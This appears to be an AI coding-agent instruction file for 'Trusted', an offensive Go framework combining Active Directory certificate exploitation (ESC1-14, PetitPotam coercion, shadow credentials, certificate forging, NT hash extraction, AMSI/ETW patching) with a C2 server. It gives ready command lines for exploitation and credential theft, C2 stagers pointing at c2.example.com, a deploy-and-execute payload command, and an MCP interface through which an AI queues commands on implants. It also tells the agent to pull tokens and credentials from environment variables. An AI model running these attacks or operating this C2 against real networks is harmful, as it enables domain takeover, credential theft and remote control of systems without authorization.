# Trusted

## Verification Protocol
When I say 'verify' or 'run a loop', systematically: 1) Build the project first, 2) Test each feature end-to-end, 3) Only claim 'done' after actual verification with evidence. NEVER claim something works without running it.

## Environment
- Primary language: Go. Ensure `go` is on PATH before starting work.
- Always check for existing tokens/credentials in environment variables before asking the user.
- Build ALL targets in Makefile, not a subset.

## Communication Rules
- Do NOT speculate about causes (VPN, routing, etc.) — investigate actual code first.
- Do NOT add licenses, co-author attributions, or other metadata without explicit permission.
- When asked to make a simple change, make the change immediately. Do not explore the codebase first.

## Overview
ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go, CGO-free.

## Architecture
- `cmd/trusted/` — CLI entry points (cobra commands)
- `pkg/pki/` — ADCS enumeration, ESC1-14 exploitation, certificate enrollment (HTTP+RPC+CMC), PKINIT authentication, UnPAC-the-hash, NTLM auth, PetitPotam/PrinterBug coercion, shadow credentials, certificate forging, reporting
- `pkg/c2/` — HTTP/HTTPS C2 listener, session management, cert-auth implants, polling agent, file delivery/deploy
- `internal/mcp/` — MCP stdio server (5 tools)
- `internal/tui/` — Bubbletea operator console with live C2 polling
- `implants/smartpotato/` — Windows potato privilege escalation (JuicyPotato, RoguePotato, SweetPotato)

## Build
```bash
CGO_ENABLED=0 go build -o trusted ./cmd/trusted
cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
```

## Features

### PKI / ADCS
- ESC1-ESC14 complete detection + exploitation via `--esc 1` through `--esc 14`
- Real certificate enrollment via CA web endpoint (/certsrv/) with NTLM auth
- NTLM pass-the-hash support for enrollment (`--hash` flag, no plaintext password needed)
- ESC1 misconfigured templates (enrollee supplies subject + auth EKU)
- ESC2 Any Purpose EKU templates
- ESC3 Enrollment Agent templates (two-stage CMC co-signed enrollment via RPC)
- ESC4 vulnerable template ACLs (full binary ACE parsing, WriteDACL/WriteOwner, LDAP modify + restore)
- ESC5 vulnerable PKI object ACLs on CA (detection — chains to ESC7 for exploitation)
- ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 on CA enrollment service (SAN injection via request attributes)
- ESC7 vulnerable CA ACLs (ManageCA → enable ESC6 → enroll → restore)
- ESC8 HTTP web enrollment relay detection + PetitPotam/PrinterBug coercion
- ESC9 CT_FLAG_NO_SECURITY_EXTENSION detection + UPN swap exploitation (LDAP modify + restore)
- ESC10 weak certificate mapping detection
- ESC11 RPC interface encryption enforcement detection
- ESC12 DCOM interface abuse detection
- ESC13 OID group link abuse detection + exploitation
- ESC14 weak explicit mappings detection
- Shadow Credentials (msDS-KeyCredentialLink add/list/remove, key persisted before LDAP modify)
- Golden certificate forging (self-signed or CA-key signed)
- Auto-pwn orchestration (enumerate → exploit → PKINIT → UnPAC → NT hash)
- PKINIT authentication (RFC 4556 DH mode, CMS SignedData, AS-REQ/REP, ccache output)
- UnPAC-the-hash (U2U TGS-REQ, PAC_CREDENTIAL_INFO decryption, NT hash extraction)
- Certificate theft: THEFT4 automated via LDAP userCertificate extraction; THEFT1-3,5 guidance playbooks
- External-tool guidance generation (certipy, Rubeus, impacket) as fallback
- PetitPotam MS-EFSRPC coercion (SMB2 + DCE/RPC, unauthenticated, stateful session)
- PrinterBug MS-RPRN coercion (SMB2 + DCE/RPC, authenticated, RpcOpenPrinterEx + RpcRemoteFindFirstPrinterChangeNotificationEx)
- WebDAV coercion for non-admin pivot relay (`--listener-port` for custom port >1024)

### C2 Framework
- HTTP/HTTPS listeners with auto-generated TLS certificates
- Session management (register, poll, command queue, result collection)
- Certificate persistence: cert-auth implants via forged certificates (Schannel mTLS with server-side verification)
- Polling agent: `trusted agent --config stager.json`
- File delivery: upload and deploy arbitrary binaries to agents
- Deploy command: `trusted deploy --c2-url <url> --session <ID> --file ./payload --path /tmp/svc --execute`
- Agent command output capped at 10MB (OOM prevention)
- Operator API: GET /api/sessions, POST /api/command, GET /api/results, POST /api/deploy, GET /health

### SmartPotato (Windows)
- JuicyPotato — BITS COM object abuse + named pipe impersonation
- SweetPotato — PrintSpoofer via Print Spooler named pipe
- RoguePotato — DCE/RPC OXID resolver redirect + DCOM activation (auto netsh port proxy)
- AMSI/ETW patching (AmsiScanBuffer + EtwEventWrite)
- Auto-detect best technique based on running services

### Operational
- Kerberos authentication (`-k`) with ccache (`--ccache` / `KRB5CCNAME`), keytab (`--keytab`), or password-based TGT
- GSSAPI bind for LDAP, SPNEGO for HTTP enrollment, Kerberos AP-REQ for SMB2/RPC enrollment
- LDAPS (`--ldaps`) and StartTLS (`--start-tls`) support
- NTLM pass-the-hash for LDAP bind (`--hash`)
- JSON structured output (`--json`)
- PFX import/export
- Stealth mode (`--stealth`, jittered LDAP queries, small page sizes)
- Engagement reporting (`--report --format markdown`)
- MCP server (5 tools: pki_enumerate, pki_forge, c2_list_sessions, c2_queue_command, c2_get_results)
- TUI operator console with live C2 polling (`trusted console --c2-url <url>`)

## Key Commands
```bash
# Enumerate
trusted pki --enum --target-dc dc01 --domain corp.local -u user -p pass
trusted pki --enum --target-dc dc01 --domain corp.local -u user -p pass --ldaps
trusted pki --enum --target-dc dc01 --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
trusted pki --enum --target-dc dc01 --domain corp.local -u user -p pass --json
trusted pki --enum --target-dc dc01 --domain corp.local -u user -p pass --stealth

# Kerberos authentication (ccache from impacket, keytab, or password TGT)
trusted pki --enum --target-dc dc01 --domain corp.local -u user -k --ccache user.ccache
KRB5CCNAME=user.ccache trusted pki --enum --target-dc dc01 --domain corp.local -u user -k
trusted pki --enum --target-dc dc01 --domain corp.local -u user -k --keytab user.keytab
trusted pki --enum --target-dc dc01 --domain corp.local -u user -p pass -k  # password-based TGT
trusted shadow --add --target victim -k --ccache user.ccache --target-dc dc01 --domain corp.local -u user

# Exploit (--esc accepts 1-14)
trusted pki --esc 1 --template Vuln --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
trusted pki --esc 3 --template AgentTemplate --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
trusted pki --esc 4 --template WritableTemplate --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
trusted pki --esc 7 --ca CorpCA --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
trusted pki --esc 9 --template NoSecExt --upn admin@corp.local --attacker-dn attacker --target-dc dc01 --domain corp.local -u user -p pass

# Scan-only ESC paths (detection + guidance, --json supported)
trusted pki --esc 5 --target-dc dc01 --domain corp.local -u user -p pass
trusted pki --esc 10 --target-dc dc01 --domain corp.local -u user -p pass --json
trusted pki --esc 14 --target-dc dc01 --domain corp.local -u user -p pass

# Relay attacks with auto-coercion (PetitPotam)
trusted pki --esc 8 --template Machine --target-dc dc01 --domain corp.local -u user -p pass --listener-ip 10.0.0.5
trusted pki --esc 8 --template Machine --target-dc dc01 --domain corp.local -u user -p pass --listener-ip 10.0.0.5 --listener-port 8080

# Certificate operations
trusted pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
trusted pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt --json
trusted pki --import-pfx cert.pfx

# Certificate theft
trusted pki --theft all                                                                           # playbook for all techniques
trusted pki --theft 4 --target-dc dc01 --domain corp.local -u user -p pass                       # THEFT4: real LDAP extraction
trusted pki --theft 4 --target-dc dc01 --domain corp.local -u user -p pass --ldaps -o certs_out  # with LDAPS + custom output dir

# Engagement reporting
trusted pki --report --format markdown --output findings.md --target-dc dc01 --domain corp.local -u user -p pass

# Shadow Credentials (accepts sAMAccountName — auto-resolves DN via LDAP)
trusted shadow --add --target victim --target-dc dc01 --domain corp.local -u user -p pass
trusted shadow --add --target victim --target-dc dc01 --domain corp.local -u user -p pass --ldaps
trusted shadow --list --target victim --target-dc dc01 --domain corp.local -u user -p pass
trusted shadow --remove --target victim --device-id <guid> --target-dc dc01 --domain corp.local -u user -p pass

# Auto-pwn (enumerate → exploit → PKINIT → UnPAC-the-hash → NT hash)
trusted auto --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
trusted auto --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass --ldaps --stealth
trusted auto --dry-run --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
trusted auto -i --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass  # interactive path selection

# C2
trusted c2 --bind 0.0.0.0 --port 8443 --protocol https
trusted c2 --generate-stager --c2-url https://c2.example.com:8443 --output stager.json
trusted c2 --implant-type cert-auth --upn admin@corp.local --c2-url https://c2.example.com:8443
trusted agent --config stager.json
trusted deploy --c2-url http://localhost:8443 --session <ID> --file ./stager --path /tmp/svc --execute
trusted console --c2-url http://localhost:8080
trusted mcp
```

## Dependencies
All pure Go, CGO_ENABLED=0 compatible:
- `github.com/spf13/cobra` — CLI framework
- `github.com/go-ldap/ldap/v3` — Native LDAP client (includes GSSAPI bind support)
- `github.com/jcmturner/gokrb5/v8` — Pure Go Kerberos 5 (ccache, keytab, SPNEGO, GSSAPI)
- `github.com/charmbracelet/bubbletea` — TUI framework
- `github.com/charmbracelet/lipgloss` — TUI styling
- `software.sslmate.com/src/go-pkcs12` — PKCS12/PFX handling
- NTLM authentication — built-in NTLMv2 implementation with inline MD4 (no external crypto deps)
